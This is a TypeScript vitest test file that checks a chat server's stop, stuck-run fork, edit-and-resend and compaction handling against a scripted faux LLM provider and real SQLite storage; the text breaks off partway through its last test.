// Tester (S11): independent probes of the stuck-run fork, edit-and-resend, stop and charts. Faux provider, real SQLite.
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { BACKGROUND_CONTEXT as context } from '@earendil-works/chord/context';
import { createModels, fauxAssistantMessage, fauxProvider, fauxText, fauxToolCall } from '@earendil-works/pi-ai';
import { createRegistry, Harness } from '@earendil-works/pi-durable';
import { chatExtension, createChats, type ChatTurn } from '../server/chat.js';
import type { Connection } from '../server/clickhouse.js';
import { createLlm, openStorage, type CheckResult, type Llm } from '../server/llm.js';
import { createRouter } from '../server/server.js';
import { withoutPageTargets } from '../web/chart-data.js';

type Message = { role: string; content: unknown; toolCallId?: string; stopReason?: string };
type Request = { messages: Message[]; sessionId?: string; model?: string };
const dirs: string[] = [];
const open: Llm[] = [];
afterEach(async () => {
  await Promise.all(open.splice(0).map(l => l.close()));
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});
const tempDir = () => { const dir = mkdtempSync(join(tmpdir(), 'studio-tester-s11-')); dirs.push(dir); return dir; };
const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const columns = [{ name: 'country', type: 'String' }, { name: 'revenue', type: 'Float64' }];
const goodCheck = (source: string): CheckResult => {
  if (source.includes('BAD')) return { ok: false, stage: 'compile', message: `refused ${source}` };
  return { ok: true, sql: `SELECT /* ${source.length} */ 1`, rowType: '{ n: number }', columns: source.includes('OTHER') ? [{ name: 'other', type: 'String' }] : columns };
};
const call = (source: string, summary?: string) => fauxToolCall('check_query', { source, ...(summary === undefined ? {} : { summary }) });
const chartCall = (args: Record<string, unknown>) => fauxToolCall('check_chart', args as never);
const round = (...calls: ReturnType<typeof fauxToolCall>[]) => fauxAssistantMessage(calls, { stopReason: 'toolUse' });
const say = (value: string) => fauxAssistantMessage([fauxText(value)]);
const spec = { mark: 'bar', encoding: { x: { field: 'country', type: 'nominal' }, y: { field: 'revenue', type: 'quantitative' } } };
const honours = (_c: unknown, options?: { signal?: AbortSignal }) => new Promise(resolve => {
  if (options?.signal?.aborted) resolve(fauxAssistantMessage('', { stopReason: 'aborted', errorMessage: 'aborted' }));
  options?.signal?.addEventListener('abort', () => resolve(fauxAssistantMessage('', { stopReason: 'aborted', errorMessage: 'aborted' })));
});
const ignores = () => new Promise(() => undefined);
/** A step that ignores the abort and answers when told to. */
function late(answer: unknown) {
  let release = () => {};
  const gate = new Promise<void>(resolve => { release = resolve; });
  return { step: async () => { await gate; return answer; }, release: () => release() };
}

async function setup(options: { check?: (source: string) => CheckResult | Promise<CheckResult>; maxTurns?: number; timeoutMs?: number; abortGraceMs?: number; dir?: string; contextWindow?: number; tokensPerSecond?: number } = {}) {
  const dir = options.dir ?? tempDir();
  const faux = fauxProvider({ models: [{ id: 'faux-a', ...(options.contextWindow ? { contextWindow: options.contextWindow, maxTokens: 1000 } : {}) }, { id: 'faux-b' }], ...(options.tokensPerSecond ? { tokensPerSecond: options.tokensPerSecond } : {}) });
  const models = createModels();
  models.setProvider(faux.provider);
  const checked: string[] = [];
  const llm = await createLlm({
    models, model: { provider: faux.provider.id, modelId: 'faux-a' }, schema: () => 'declare const events: unknown;\n',
    check: source => { checked.push(source); return (options.check ?? goodCheck)(source); }, storage: await openStorage(dir),
    abortGraceMs: options.abortGraceMs ?? 200,
    ...(options.maxTurns ? { maxTurns: options.maxTurns } : {}), ...(options.timeoutMs ? { timeoutMs: options.timeoutMs } : {}),
  });
  open.push(llm);
  const seen: Request[] = [];
  const wrap = (step: unknown) => (ctx: Request, opts: { sessionId?: string } | undefined, state: unknown, model?: { id: string }) => {
    seen.push({ ...JSON.parse(JSON.stringify(ctx)) as Request, ...(opts?.sessionId ? { sessionId: opts.sessionId } : {}), ...(model ? { model: model.id } : {}) });
    return typeof step === 'function' ? (step as (...a: unknown[]) => unknown)(ctx, opts, state, model) : step;
  };
  const script = (...steps: unknown[]) => faux.setResponses(steps.map(wrap) as never);
  const more = (...steps: unknown[]) => faux.appendResponses(steps.map(wrap) as never);
  const api = createRouter({} as Connection, llm).createCaller({});
  const until = async (condition: () => boolean, what: string) => {
    const deadline = Date.now() + 10_000;
    while (!condition()) {
      if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}`);
      await sleep(2);
    }
  };
  const chatIdOf = async () => (await api.chat.list())[0]!.id;
  const turns = async (id: string) => (await api.chat.get({ id }))!.turns;
  return { api, llm, faux, script, more, seen, until, dir, checked, chatIdOf, turns };
}

function assertWellFormed(request: Request) {
  const pending: string[] = [];
  for (const message of request.messages) {
    if (message.role === 'assistant') {
      expect(pending, 'tool calls left unanswered before an assistant message').toEqual([]);
      for (const block of message.content as { type: string; id: string }[]) if (block.type === 'toolCall') pending.push(block.id);
    } else if (message.role === 'toolResult') {
      expect(pending, 'tool result without its call').toContain(message.toolCallId);
      pending.splice(pending.indexOf(message.toolCallId!), 1);
    } else expect(pending, 'tool calls left unanswered before a user message').toEqual([]);
  }
  expect(pending, 'tool calls left unanswered at the end').toEqual([]);
}
const kinds = (turns: ChatTurn[]) => turns.map(t => t.kind);
const numbers = (turns: ChatTurn[]) => turns.flatMap(t => (t.kind === 'version' ? [t.n] : []));
const dump = (request: Request) => JSON.stringify(request);
const userId = (turns: ChatTurn[], text: string) => turns.find(t => t.kind === 'user' && t.text === text)!.id;

describe('stuck-run fork: a late answer at each stage never counts', () => {
  const answers = {
    'a passing check': () => round(call('LATE_SOURCE', 'LATE_SUMMARY')),
    'a passing chart': () => round(chartCall({ spec, source: 'LATE_SOURCE', summary: 'LATE_SUMMARY' })),
    'a failing check': () => round(call('BAD LATE_SOURCE', 'LATE_SUMMARY')),
    'a text answer': () => say('LATE_SOURCE LATE_SUMMARY'),
  };
  const clean = async (s: Awaited<ReturnType<typeof setup>>, chatId: string, firstRequest: number) => {
    const detail = await s.api.chat.get({ id: chatId });
    expect(JSON.stringify(detail)).not.toContain('LATE_');
    for (const request of s.seen.slice(firstRequest)) { expect(dump(request)).not.toContain('LATE_'); assertWellFormed(request); }
  };
  describe.each(Object.entries(answers))('%s', (_name, answer) => {
    it('arrives right after the stop returned, before any next send', async () => {
      const s = await setup();
      const lateAnswer = late(answer());
      s.script(round(call('Q1')), lateAnswer.step, round(call('Q2')));
      const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
      const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
      await s.until(() => s.seen.length === 2, 'request 2');
      expect(await s.api.chat.stop({ id: chatId! })).toEqual({ stopped: true });
      await sending;
      lateAnswer.release();
      await sleep(50);
      expect(s.checked.filter(c => c.includes('LATE_'))).toEqual([]);
      expect(await s.api.chat.send({ chatId, text: 'three', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2, source: 'Q2' } });
      await clean(s, chatId!, 2);
    });
    it('arrives while the next send is running in the fork', async () => {
      const s = await setup();
      const lateAnswer = late(answer());
      const next = late(round(call('Q2')));
      s.script(round(call('Q1')), lateAnswer.step, next.step);
      const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
      const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
      await s.until(() => s.seen.length === 2, 'request 2');
      await s.api.chat.stop({ id: chatId! });
      await sending;
      const third = s.api.chat.send({ chatId, text: 'three', source: 'Q1' });
      await s.until(() => s.seen.length === 3, 'request 3');
      lateAnswer.release();
      await sleep(50);
      next.release();
      expect(await third).toMatchObject({ ok: true, turn: { n: 2, source: 'Q2' } });
      await clean(s, chatId!, 2);
      s.more(say('after'));
      await s.api.chat.send({ chatId, text: 'four', source: 'Q2' });
      await clean(s, chatId!, 2);
    });
    it('arrives after the next send finished, and after an edit-and-resend', async () => {
      const s = await setup();
      const lateAnswer = late(answer());
      s.script(round(call('Q1')), lateAnswer.step, round(call('Q2')), round(call('Q3')), say('end'));
      const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
      const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
      await s.until(() => s.seen.length === 2, 'request 2');
      await s.api.chat.stop({ id: chatId! });
      await sending;
      await s.api.chat.send({ chatId, text: 'three', source: 'Q1' });
      await s.api.chat.send({ chatId, text: 'threeB', source: 'Q2', replaceFrom: userId(await s.turns(chatId!), 'three') });
      lateAnswer.release();
      await sleep(50);
      await s.api.chat.send({ chatId, text: 'four', source: 'Q3' });
      await clean(s, chatId!, 2);
      expect(numbers(await s.turns(chatId!))).toEqual([1, 2]);
    });
  });

  it('a tool that ignores the abort and finishes later: nothing reaches the thread or a later request', async () => {
    let release = (_r: CheckResult) => {};
    const s = await setup({ check: source => (source === 'LATE_HANG' ? new Promise<CheckResult>(resolve => { release = resolve; }) : goodCheck(source)) });
    s.script(round(call('Q1')), round(call('LATE_HANG', 'LATE_SUMMARY')), round(call('Q2')));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
    const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
    await s.until(() => s.checked.includes('LATE_HANG'), 'the check');
    await s.api.chat.stop({ id: chatId! });
    expect(await sending).toMatchObject({ ok: false, stopped: true });
    release({ ok: true, sql: 'SELECT 1', rowType: '{}', columns });
    await sleep(50);
    expect(await s.api.chat.send({ chatId, text: 'three', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2 } });
    const detail = await s.api.chat.get({ id: chatId! });
    expect(numbers(detail!.turns)).toEqual([1, 2]);
    expect(detail!.turns.flatMap(t => (t.kind === 'version' ? [t.source] : []))).not.toContain('LATE_HANG');
    assertWellFormed(s.seen.at(-1)!);
  });

  // Recorded: a timed-out run whose last result passed still gives a version of that source. It did pass both checks, so R13.4 holds.
  it('a timeout with one passing call and one that hangs in the same round: only a checked source, and the chat stays well-formed', async () => {
    const s = await setup({ timeoutMs: 150, abortGraceMs: 100, check: source => (source === 'HANG' ? new Promise<CheckResult>(() => undefined) : goodCheck(source)) });
    s.script(round(call('PASSED_IN_TIMED_OUT_RUN'), call('HANG')), round(call('Q2')));
    const sent = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
    if (sent.ok && sent.turn.kind === 'version') expect(sent.turn.source).toBe('PASSED_IN_TIMED_OUT_RUN');
    expect(JSON.stringify(sent)).not.toContain('"source":"HANG"');
    const next = await s.api.chat.send({ chatId: sent.chatId, text: 'two', source: '' });
    expect(next).toMatchObject({ ok: true, turn: { source: 'Q2' } });
    assertWellFormed(s.seen.at(-1)!);
  });
});

describe('stuck-run fork: repetition', () => {
  it('25 stuck runs in one chat by stop: every send answers or stops in time, the 26th works, another chat too', async () => {
    const s = await setup({ abortGraceMs: 40 });
    s.script(...Array.from({ length: 25 }, () => ignores), round(call('Q_END')), round(call('Q_OTHER')));
    let chatId: string | null = null;
    for (let i = 0; i < 25; i++) {
      const sending: Promise<{ chatId: string | null }> = s.api.chat.send({ chatId, text: `stuck${i}`, source: '' });
      await s.until(() => s.seen.length === i + 1, `request ${i + 1}`);
      chatId ??= await s.chatIdOf();
      await s.api.chat.stop({ id: chatId });
      await sending;
    }
    const started = performance.now();
    expect(await s.api.chat.send({ chatId, text: 'end', source: '' })).toMatchObject({ ok: true, turn: { n: 1, source: 'Q_END' } });
    expect(await s.api.chat.send({ chatId: null, text: 'other', source: '' })).toMatchObject({ ok: true, turn: { n: 1 } });
    expect(performance.now() - started).toBeLessThan(5_000);
    const detail = await s.api.chat.get({ id: chatId! });
    expect(kinds(detail!.turns).filter(k => k === 'note')).toHaveLength(25);
    for (let i = 0; i < 25; i++) expect(JSON.stringify(s.seen[25]!.messages)).toContain(`stuck${i}`);
    assertWellFormed(s.seen[25]!);
  }, 60_000);

  it('a double stop and a third stop on a stuck run return within the grace and change nothing', async () => {
    const s = await setup({ abortGraceMs: 300 });
    s.script(round(call('Q1')), ignores, round(call('Q2')));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
    const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
    await s.until(() => s.seen.length === 2, 'request 2');
    const started = performance.now();
    const stops = await Promise.all([s.api.chat.stop({ id: chatId! }), s.api.chat.stop({ id: chatId! }), s.api.chat.stop({ id: chatId! })]);
    expect(performance.now() - started).toBeLessThan(1_500);
    expect(stops.filter(r => r.stopped)).toHaveLength(1);
    await sending;
    expect(await s.api.chat.stop({ id: chatId! })).toEqual({ stopped: false });
    expect(kinds(await s.turns(chatId!))).toEqual(['user', 'version', 'user', 'note']);
    expect(await s.api.chat.send({ chatId, text: 'three', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2 } });
  });

  it('stop then edit-and-resend on a stuck run, for a mid-thread turn, repeatedly, keeps only what it should', async () => {
    const s = await setup({ abortGraceMs: 40 });
    s.script(round(call('Q_ALPHA')), ignores, ignores, ignores, round(call('Q_ECHO')), say('fine'));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'ALPHA', source: '' });
    let sentText = 'BRAVO_0';
    let sending = s.api.chat.send({ chatId, text: sentText, source: 'Q_ALPHA' });
    for (let i = 0; i < 3; i++) {
      await s.until(() => s.seen.length === 2 + i, `request ${2 + i}`);
      await s.api.chat.stop({ id: chatId! });
      expect(await sending).toMatchObject({ ok: false, stopped: true });
      const id = userId(await s.turns(chatId!), sentText);
      sentText = i === 2 ? 'ECHO' : `BRAVO_${i + 1}`;
      sending = s.api.chat.send({ chatId, text: sentText, source: 'Q_ALPHA', replaceFrom: id });
    }
    expect(await sending).toMatchObject({ ok: true, turn: { n: 2, source: 'Q_ECHO' } });
    await s.api.chat.send({ chatId, text: 'FOXTROT', source: 'Q_ECHO' });
    const last = dump(s.seen.at(-1)!);
    expect(last).toContain('ALPHA');
    expect(last).toContain('ECHO');
    expect(last).not.toContain('BRAVO');
    assertWellFormed(s.seen.at(-1)!);
    expect(kinds(await s.turns(chatId!))).toEqual(['user', 'version', 'user', 'version', 'user', 'text']);
    expect(new Set(s.seen.map(r => r.sessionId)).size).toBeGreaterThan(1);
  });

  it('stop then edit-and-resend the first turn on a stuck run: a fresh conversation with nothing of it', async () => {
    const s = await setup({ abortGraceMs: 40 });
    s.script(ignores, round(call('Q1')));
    const sending = s.api.chat.send({ chatId: null, text: 'FIRST_WORDS', source: 'FIRST_SOURCE' });
    await s.until(() => s.seen.length === 1, 'request');
    const chatId = await s.chatIdOf();
    await s.api.chat.stop({ id: chatId });
    await sending;
    const id = userId(await s.turns(chatId), 'FIRST_WORDS');
    expect(await s.api.chat.send({ chatId, text: 'NEW_WORDS', source: '', replaceFrom: id })).toMatchObject({ ok: true, turn: { n: 1 } });
    expect(dump(s.seen[1]!)).not.toContain('FIRST_');
    expect(s.seen[1]!.sessionId).not.toBe(s.seen[0]!.sessionId);
    expect((await s.api.chat.list())[0]!.title).toBe('NEW_WORDS');
    expect(JSON.stringify(await s.api.chat.get({ id: chatId }))).not.toContain('FIRST_');
  });

  it('close() stays within its bound with many stuck runs and a stuck send in flight', async () => {
    const s = await setup({ abortGraceMs: 60 });
    s.script(...Array.from({ length: 10 }, () => ignores), ignores);
    let chatId: string | null = null;
    for (let i = 0; i < 10; i++) {
      const sending: Promise<{ chatId: string | null }> = s.api.chat.send({ chatId, text: `s${i}`, source: '' });
      await s.until(() => s.seen.length === i + 1, 'request');
      chatId ??= await s.chatIdOf();
      await s.api.chat.stop({ id: chatId });
      await sending;
    }
    const inFlight = s.api.chat.send({ chatId, text: 'in flight', source: '' }).then(r => r, (e: Error) => e);
    await s.until(() => s.seen.length === 11, 'request');
    const started = performance.now();
    await s.llm.close();
    expect(performance.now() - started).toBeLessThan(1_000);
    void inFlight;
  }, 30_000);
});

describe('edit and resend', () => {
  /** ALPHA v1, BRAVO v2, CHARLIE v3. */
  async function threeTurns(options: Parameters<typeof setup>[0] = {}) {
    const s = await setup(options);
    s.script(round(call('Q_ALPHA')), round(call('Q_BRAVO')), round(call('Q_CHARLIE')));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'ALPHA', source: '' });
    await s.api.chat.send({ chatId, text: 'BRAVO', source: 'Q_ALPHA' });
    await s.api.chat.send({ chatId, text: 'CHARLIE', source: 'Q_BRAVO' });
    return { ...s, chatId: chatId! };
  }
  it.each([
    ['a mid-thread turn after a chart', [round(call('Q_A')), round(chartCall({ spec, summary: 'SUM_CHART_DROPPED' })), round(call('Q_C_DROPPED'))], 2, ['user', 'version', 'user', 'version'], [1, 2]],
    ['a chart turn itself', [round(call('Q_A')), round(chartCall({ spec, summary: 'SUM_CHART_DROPPED' })), say('SUM_DROPPED_TOO')], 2, ['user', 'version', 'user', 'version'], [1, 2]],
    ['a text turn', [round(call('Q_A')), say('TEXT_DROPPED'), round(call('Q_C_DROPPED'))], 2, ['user', 'version', 'user', 'version'], [1, 2]],
    ['an error turn', [round(call('Q_A')), round(call('BAD_DROPPED')), round(call('BAD_DROPPED_2')), round(call('Q_C_DROPPED'))], 2, ['user', 'version', 'user', 'version'], [1, 2]],
  ])('%s: its words and later ones leave every later request, numbers follow', async (_name, steps, index, expected, versions) => {
    const s = await setup({ maxTurns: 2 });
    const next = round(call('Q_NEW'));
    s.script(...(steps as unknown[]));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'KEEP', source: '' });
    await s.api.chat.send({ chatId, text: 'WORD_B_DROPPED', source: 'Q_A' });
    await s.api.chat.send({ chatId, text: 'WORD_C_DROPPED', source: 'SOURCE_C_DROPPED' });
    const id = userId(await s.turns(chatId!), index === 2 ? 'WORD_B_DROPPED' : 'KEEP');
    s.script(next, say('after'));
    const start = s.seen.length;
    const sent = await s.api.chat.send({ chatId, text: 'WORD_NEW', source: 'Q_A', replaceFrom: id });
    expect(sent).toMatchObject({ ok: true, turn: { source: 'Q_NEW' } });
    await s.api.chat.send({ chatId, text: 'WORD_AFTER', source: 'Q_NEW' });
    for (const request of s.seen.slice(start)) {
      for (const dropped of ['DROPPED']) expect(dump(request)).not.toContain(dropped);
      expect(dump(request)).toContain('KEEP');
      assertWellFormed(request);
    }
    const detail = await s.api.chat.get({ id: chatId! });
    expect(JSON.stringify(detail)).not.toContain('DROPPED');
    expect(kinds(detail!.turns).slice(0, 4)).toEqual(expected);
    expect(numbers(detail!.turns)).toEqual(versions);
  });

  it('a turn with a Stopped note (not stuck): the turn, its note and the partial answer are gone', async () => {
    const s = await setup();
    s.script(round(call('Q_A')), honours, round(call('Q_NEW')));
    const { chatId } = await s.api.chat.send({ chatId: null, text: 'KEEP', source: '' });
    const sending = s.api.chat.send({ chatId, text: 'STOPPED_WORD', source: 'Q_A' });
    await s.until(() => s.seen.length === 2, 'request 2');
    await s.api.chat.stop({ id: chatId! });
    await sending;
    expect(kinds(await s.turns(chatId!))).toEqual(['user', 'version', 'user', 'note']);
    const sent = await s.api.chat.send({ chatId, text: 'NEW_WORD', source: 'Q_A', replaceFrom: userId(await s.turns(chatId!), 'STOPPED_WORD') });
    expect(sent).toMatchObject({ ok: true, turn: { n: 2 } });
    expect(dump(s.seen[2]!)).not.toContain('STOPPED_WORD');
    assertWellFormed(s.seen[2]!);
    expect(kinds(await s.turns(chatId!))).toEqual(['user', 'version', 'user', 'version']);
  });

  it('a stale or invalid id is refused and changes nothing, and a dropped branch\'s ids are stale', async () => {
    const s = await threeTurns();
    const before = await s.turns(s.chatId);
    const charlie = userId(before, 'CHARLIE');
    const reply = before.find(t => t.kind === 'version')!.id;
    s.script(round(call('Q_DELTA')));
    const conversationId = (await s.api.chat.list())[0]!.conversationId;
    for (const replaceFrom of [reply, -1, 0, 2 ** 40, conversationId]) {
      expect(await s.api.chat.send({ chatId: s.chatId, text: 'NOPE', source: '', replaceFrom })).toMatchObject({ ok: false, error: expect.stringContaining('not a message') });
    }
    for (const replaceFrom of [1.5, '5', null, NaN]) await expect(s.api.chat.send({ chatId: s.chatId, text: 'NOPE', source: '', replaceFrom } as never)).rejects.toThrow(/Expected/);
    expect(await s.turns(s.chatId)).toEqual(before);
    expect((await s.api.chat.list())[0]!.conversationId).toBe(conversationId);
    expect(await s.api.chat.send({ chatId: null, text: 'NOPE', source: '', replaceFrom: charlie })).toMatchObject({ ok: false });
    expect(await s.api.chat.list()).toHaveLength(1);
    // Now drop CHARLIE: its id must be stale for later.
    await s.api.chat.send({ chatId: s.chatId, text: 'DELTA', source: 'Q_BRAVO', replaceFrom: charlie });
    expect(await s.api.chat.send({ chatId: s.chatId, text: 'AGAIN', source: '', replaceFrom: charlie })).toMatchObject({ ok: false, error: expect.stringContaining('not a message') });
    expect(kinds(await s.turns(s.chatId))).toHaveLength(6);
  });

  it('another chat\'s turn id is refused', async () => {
    const s = await threeTurns();
    s.more(say('other'));
    const other = await s.api.chat.send({ chatId: null, text: 'OTHER', source: '' });
    expect(await s.api.chat.send({ chatId: s.chatId, text: 'x', source: '', replaceFrom: userId(await s.turns(other.chatId!), 'OTHER') })).toMatchObject({ ok: false });
    expect(kinds(await s.turns(s.chatId))).toHaveLength(6);
  });

  it('a resend that fails or is stopped: the dropped turns stay dropped', async () => {
    const s = await threeTurns({ maxTurns: 1 });
    s.script(round(call('BAD_NEW')), honours, round(call('Q_NEW')));
    const id = userId(await s.turns(s.chatId), 'CHARLIE');
    expect(await s.api.chat.send({ chatId: s.chatId, text: 'FAILS', source: 'Q_BRAVO', replaceFrom: id })).toMatchObject({ ok: false, turn: { kind: 'error' } });
    expect(JSON.stringify(await s.turns(s.chatId))).not.toContain('CHARLIE');
    const again = s.api.chat.send({ chatId: s.chatId, text: 'STOPS', source: 'Q_BRAVO', replaceFrom: userId(await s.turns(s.chatId), 'FAILS') });
    await s.until(() => s.seen.length === 5, 'request');
    await s.api.chat.stop({ id: s.chatId });
    await again;
    expect(JSON.stringify(await s.turns(s.chatId))).not.toContain('FAILS');
    await s.api.chat.send({ chatId: s.chatId, text: 'WORKS', source: 'Q_BRAVO' });
    for (const word of ['CHARLIE', 'FAILS']) expect(dump(s.seen.at(-1)!)).not.toContain(word);
    expect(numbers(await s.turns(s.chatId))).toEqual([1, 2, 3]);
  });

  it('retry: replaceFrom with the same text and source, three times, stays one turn and one number', async () => {
    const s = await threeTurns();
    s.script(round(call('Q_R1')), round(call('Q_R2')), round(call('Q_R3')));
    for (const source of ['Q_R1', 'Q_R2', 'Q_R3']) {
      const sent = await s.api.chat.send({ chatId: s.chatId, text: 'CHARLIE', source: 'Q_BRAVO', replaceFrom: userId(await s.turns(s.chatId), 'CHARLIE') });
      expect(sent).toMatchObject({ ok: true, turn: { n: 3, source, changes: expect.arrayContaining([{ type: 'remove', text: 'Q_BRAVO' }, { type: 'add', text: source }]) } });
    }
    const last = s.seen.at(-1)!;
    expect(dump(last)).not.toContain('Q_R1');
    expect(dump(last)).not.toContain('Q_R2');
    expect(dump(last).match(/CHARLIE/g)).toHaveLength(1);
    expect(kinds(await s.turns(s.chatId))).toHaveLength(6);
  });

  it('each branch has its own provider session id', async () => {
    const s = await threeTurns();
    s.script(round(call('Q_D')), round(call('Q_E')));
    await s.api.chat.send({ chatId: s.chatId, text: 'D', source: 'Q_A', replaceFrom: userId(await s.turns(s.chatId), 'BRAVO') });
    await s.api.chat.send({ chatId: s.chatId, text: 'E', source: '', replaceFrom: userId(await s.turns(s.chatId), 'ALPHA') });
    const ids = s.seen.map(r => r.sessionId);
    expect(ids[0]).toBeDefined();
    expect(ids[1]).toBe(ids[0]);
    expect(ids[3]).not.toBe(ids[0]);
    expect(ids[4]).not.toBe(ids[0]);
    expect(ids[4]).not.toBe(ids[3]);
  });

  it('the model chosen now applies on the branch', async () => {
    const s = await threeTurns();
    await s.llm.selectModel({ provider: s.faux.provider.id, modelId: 'faux-b' });
    s.script(round(call('Q_D')));
    await s.api.chat.send({ chatId: s.chatId, text: 'D', source: 'Q_A', replaceFrom: userId(await s.turns(s.chatId), 'BRAVO') });
    expect(s.seen.at(-1)!.model).toBe('faux-b');
  });

  it('compaction: a summary that repeats everything it saw never brings dropped words back, before or after the edit, and across a reopen', async () => {
    const dir = tempDir();
    const s = await setup({ dir, contextWindow: 24_000 });
    const all: Request[] = [];
    let summaries = 0;
    const isChat = (ctx: Request) => JSON.stringify(ctx.messages.filter(m => m.role === 'system')).includes('You write TypedHouse queries');
    const respond = (ctx: Request) => {
      all.push(JSON.parse(JSON.stringify(ctx)) as Request);
      if (!isChat(ctx)) {
        summaries++;
        // Summarises by repeating every sentinel word it was shown, the worst case.
        return say(`SUMMARY ${[...new Set(JSON.stringify(ctx.messages).match(/WORD_[A-Z0-9_]+/g) ?? [])].join(' ')}`);
      }
      const prompt = JSON.stringify(ctx.messages.filter(m => m.role === 'user').at(-1)?.content);
      return round(call(`Q_${/WORD_[A-Z0-9_]+/.exec(prompt)![0]}`));
    };
    s.faux.setResponses(Array.from({ length: 300 }, () => respond as never));
    const pad = 'lorem ipsum '.repeat(1_100);
    let chatId: string | null = null;
    for (let i = 0; i < 6; i++) chatId = (await s.api.chat.send({ chatId, text: `WORD_KEEP_${i} ${pad}`, source: '' })).chatId;
    // These are the turns to drop; summaries made from here on may name them.
    for (let i = 0; i < 6; i++) await s.api.chat.send({ chatId, text: `WORD_GONE_${i} ${pad}`, source: '' });
    expect(summaries, 'compaction ran before the edit').toBeGreaterThan(0);
    const turns = await s.turns(chatId!);
    const id = turns.find(t => t.kind === 'user' && t.text.startsWith('WORD_GONE_0'))!.id;
    all.length = 0;
    const before = summaries;
    await s.api.chat.send({ chatId, text: `WORD_NEW_0 ${pad}`, source: '', replaceFrom: id });
    for (let i = 1; i < 8; i++) await s.api.chat.send({ chatId, text: `WORD_NEW_${i} ${pad}`, source: '' });
    expect(summaries, 'compaction ran after the edit').toBeGreaterThan(before);
    for (const request of all) expect(JSON.stringify(request.messages)).not.toContain('WORD_GONE');
    expect(JSON.stringify(await s.api.chat.get({ id: chatId! }))).not.toContain('WORD_GONE');
    await s.llm.close();
    const next = await setup({ dir, contextWindow: 24_000 });
    const after: Request[] = [];
    next.faux.setResponses(Array.from({ length: 10 }, () => ((ctx: Request) => { after.push(JSON.parse(JSON.stringify(ctx)) as Request); return isChat(ctx) ? round(call('Q_LAST')) : say('SUMMARY'); }) as never));
    expect(await next.api.chat.send({ chatId, text: 'WORD_LAST', source: '' })).toMatchObject({ ok: true });
    for (const request of after) expect(JSON.stringify(request.messages)).not.toContain('WORD_GONE');
  }, 120_000);

  it('a slow compaction running when the edit happens: its late summary stays on the old branch', async () => {
    const s = await setup({ contextWindow: 24_000 });
    let releaseSummary = () => {};
    let summaryStarted = false;
    const all: Request[] = [];
    const isChat = (ctx: Request) => JSON.stringify(ctx.messages.filter(m => m.role === 'system')).includes('You write TypedHouse queries');
    const respond = async (ctx: Request) => {
      all.push(JSON.parse(JSON.stringify(ctx)) as Request);
      if (!isChat(ctx)) {
        summaryStarted = true;
        await new Promise<void>(resolve => { releaseSummary = resolve; });
        return say(`SUMMARY ${[...new Set(JSON.stringify(ctx.messages).match(/WORD_[A-Z0-9_]+/g) ?? [])].join(' ')}`);
      }
      const prompt = JSON.stringify(ctx.messages.filter(m => m.role === 'user').at(-1)?.content);
      return round(call(`Q_${/WORD_[A-Z0-9_]+/.exec(prompt)![0]}`));
    };
    s.faux.setResponses(Array.from({ length: 100 }, () => respond as never));
    const pad = 'lorem ipsum '.repeat(1_100);
    let chatId: string | null = null;
    let i = 0;
    while (!summaryStarted && i < 14) {
      const sending: Promise<{ chatId: string | null }> = s.api.chat.send({ chatId, text: `WORD_GONE_${i++} ${pad}`, source: '' });
      // A compaction the request has to wait for keeps the send open; one in the background lets it finish.
      const finished = await Promise.race([sending, s.until(() => summaryStarted, 'summary').then(() => undefined, () => undefined)]);
      chatId ??= await s.chatIdOf();
      if (finished === undefined) {
        await sleep(20);
        await s.api.chat.stop({ id: chatId });
        await sending;
      }
    }
    expect(summaryStarted, 'a compaction started').toBe(true);
    const keep = (await s.turns(chatId!)).filter(t => t.kind === 'user');
    all.length = 0;
    const sent = await Promise.race([s.api.chat.send({ chatId, text: 'WORD_NEW', source: '', replaceFrom: keep[1]!.id }), sleep(5_000).then(() => 'HUNG' as const)]);
    expect(sent).not.toBe('HUNG');
    expect(sent, JSON.stringify(sent).slice(0, 300)).toMatchObject({ ok: true });
    releaseSummary();
    await sleep(100);
    const after = await s.api.chat.send({ chatId, text: 'WORD_AFTER', source: '' });
    expect(after, JSON.stringify(after).slice(0, 300)).toMatchObject({ ok: true });
    for (const request of all.filter(isChat)) expect(JSON.stringify(request.messages)).not.toMatch(/WORD_GONE_[1-9]/);
    expect(JSON.stringify(await s.api.chat.get({ id: chatId! }))).not.toMatch(/WORD_GONE_[1-9]/);
  }, 60_000);
});

describe('stop', () => {
  it('really streaming: stopped in the middle of a long tool call and of long text; the next request is well-formed and nothing is half-applied', async () => {
    for (const partial of [round(call(`PARTIAL_SOURCE ${'x'.repeat(4_000)}`)), say(`PARTIAL_TEXT ${'y '.repeat(2_000)}`)]) {
      const s = await setup({ tokensPerSecond: 30 });
      s.script(round(call('Q1')), partial, round(call('Q2')));
      s.faux.state.callCount = 0;
      const { chatId } = await s.api.chat.send({ chatId: null, text: 'one', source: '' });
      const started = performance.now();
      const sending = s.api.chat.send({ chatId, text: 'two', source: 'Q1' });
      await s.until(() => s.seen.length === 2, 'request 2');
      await sleep(150);
      expect(await s.api.chat.stop({ id: chatId! })).toEqual({ stopped: true });
      expect(await sending).toMatchObject({ ok: false, stopped: true });
      // Stopped well before the answer could have finished at this rate, and not through the stuck path.
      expect(performance.now() - started).toBeLessThan(2_000);
      expect(kinds(await s.turns(chatId!))).toEqual(['user', 'version', 'user', 'note']);
      expect(await s.api.chat.send({ chatId, text: 'three', source: 'Q1' })).toMatchObject({ ok: true, turn: { n: 2, source: 'Q2' } });
